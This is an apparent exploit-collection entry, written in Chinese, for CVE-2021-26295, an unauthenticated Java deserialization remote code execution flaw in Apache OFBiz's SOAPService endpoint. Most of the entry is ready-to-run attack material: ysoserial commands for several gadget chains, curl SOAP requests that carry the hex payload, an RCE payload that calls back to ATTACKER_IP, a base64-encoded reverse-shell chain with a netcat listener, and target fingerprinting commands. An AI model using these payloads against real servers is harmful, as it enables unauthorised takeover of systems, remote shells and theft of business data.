Vuln/middleware/ofbiz/CVE-2021-26295.md

---
id: CVE-2021-26295
title: Apache OFBiz RMI 反序列化远程代码执行漏洞
product: ofbiz
vendor: Apache
version_affected: "< 17.12.06"
severity: CRITICAL
tags: [rce, deserialization, 无需认证]
fingerprint: ["Apache OFBiz", "OFBiz"]
---

## 漏洞描述

Apache OFBiz 17.12.06 之前版本的 SOAP 端点 `/webtools/control/SOAPService` 在处理请求时，会反序列化 XML 中 `cus-obj` 标签包含的 Java 序列化对象，且未进行类型校验。攻击者可构造恶意序列化 payload 嵌入 SOAP 请求，利用 classpath 中的 gadget 链实现远程代码执行。

## 影响版本

- Apache OFBiz < 17.12.06

## 前置条件

- 无需认证
- 能够访问 OFBiz 的 HTTPS 端口（默认 8443）
- `/webtools/control/SOAPService` 端点可达

## 利用步骤

1. 确认目标为 Apache OFBiz（登录页面、favicon 等特征）
2. 使用 ysoserial 生成恶意序列化 payload（先用 URLDNS 验证，再用 ROME 等链 RCE）
3. 将 payload 转为十六进制编码
4. 构造 SOAP 请求，将 hex payload 嵌入 `cus-obj` 标签发送至 SOAPService 端点
5. 通过 DNS 回调或反弹 shell 确认利用成功

## Payload

```bash
# 步骤1: 生成 DNS 外带验证 payload（无 gadget 依赖）
java -jar ysoserial.jar URLDNS "http://ATTACKER.dnslog.cn" | xxd -p | tr -d '\n' > hex_payload.txt

# 步骤2: 发送 SOAP 请求（将 HEX_PAYLOAD_HERE 替换为上一步生成的 hex 内容）
curl -X POST "https://target:8443/webtools/control/SOAPService" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header/><soapenv:Body><ser:clearAllEntityCaches xmlns:ser="http://ofbiz.apache.org/service/"><ser:cus-obj>HEX_PAYLOAD_HERE</ser:cus-obj></ser:clearAllEntityCaches></soapenv:Body></soapenv:Envelope>' \
  -k
```

```bash
# RCE — 使用 ROME gadget 链
java -jar ysoserial.jar ROME "curl http://ATTACKER_IP/callback" | xxd -p | tr -d '\n' > rce_payload.txt

curl -X POST "https://target:8443/webtools/control/SOAPService" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header/><soapenv:Body><ser:clearAllEntityCaches xmlns:ser="http://ofbiz.apache.org/service/"><ser:cus-obj>RCE_HEX_PAYLOAD_HERE</ser:cus-obj></ser:clearAllEntityCaches></soapenv:Body></soapenv:Envelope>' \
  -k
```

```bash
# 反弹 shell — 使用 CommonsBeanutils1 链
# bash -c {echo,BASE64_OF_REVERSE_SHELL}|{base64,-d}|bash
java -jar ysoserial.jar CommonsBeanutils1 "bash -c {echo,BASE64_ENCODED_PAYLOAD}|{base64,-d}|bash" | xxd -p | tr -d '\n' > shell_payload.txt

curl -X POST "https://target:8443/webtools/control/SOAPService" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header/><soapenv:Body><ser:clearAllEntityCaches xmlns:ser="http://ofbiz.apache.org/service/"><ser:cus-obj>SHELL_HEX_PAYLOAD_HERE</ser:cus-obj></ser:clearAllEntityCaches></soapenv:Body></soapenv:Envelope>' \
  -k
```

## 验证方法

```bash
# 方法1: DNS 外带验证（推荐首选）
# 发送 URLDNS payload 后检查 dnslog 平台是否收到目标的 DNS 查询

# 方法2: HTTP 回调验证
python3 -m http.server 80
# 发送 ROME gadget 的 curl 回调 payload，检查监听端是否收到请求

# 方法3: 反弹 shell
nc -lvp 4444
# 发送反弹 shell payload 后检查是否收到连接
```

## 指纹确认

```bash
# 检查 OFBiz 登录页面特征
curl -sk "https://target:8443/webtools/control/main" | grep -i "OFBiz"

# 检查 SOAP 端点是否可达
curl -sk -o /dev/null -w "%{http_code}" "https://target:8443/webtools/control/SOAPService"

# 检查默认端口
curl -sk -o /dev/null -w "%{http_code}" "https://target:8443/"
```

## 参考链接

- https://nvd.nist.gov/vuln/detail/CVE-2021-26295
- https://ofbiz.apache.org/security.html
- https://lists.apache.org/thread/k8s76l0whydy8fn1zrhmgbvqxqo8rvrr
